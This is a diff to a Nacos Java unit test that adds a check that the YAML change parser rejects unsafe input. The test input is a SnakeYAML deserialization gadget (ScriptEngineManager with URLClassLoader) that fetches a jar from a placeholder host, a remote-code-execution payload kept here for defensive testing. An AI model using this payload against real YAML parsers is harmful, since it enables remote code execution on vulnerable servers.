@@ -17,6 +17,7 @@
 package com.alibaba.nacos.client.config.listener.impl;
 
 import com.alibaba.nacos.api.config.ConfigChangeItem;
+import com.alibaba.nacos.api.exception.runtime.NacosRuntimeException;
 import com.alibaba.nacos.client.config.impl.YmlChangeParser;
 import org.junit.Assert;
 import org.junit.Test;
@@ -54,6 +55,13 @@ public class YmlChangeParserTest {
         Map<String, ConfigChangeItem> map = parser.doParse("app:\n  name: rocketMQ", "app:\n  name: nacos", type);
         Assert.assertEquals("rocketMQ", map.get("app.name").getOldValue());
         Assert.assertEquals("nacos", map.get("app.name").getNewValue());
+    }
+    
+    @Test(expected = NacosRuntimeException.class)
+    public void testChangeInvalidKey() {
+        parser.doParse("anykey:\n  a", "anykey: !!javax.script.ScriptEngineManager [\n"
+                + "  !!java.net.URLClassLoader [[\n"
+                + "    !!java.net.URL [\"http://[yourhost]:[port]/yaml-payload.jar\"]\n" + "  ]]\n" + "]", type);
     }
 }
 
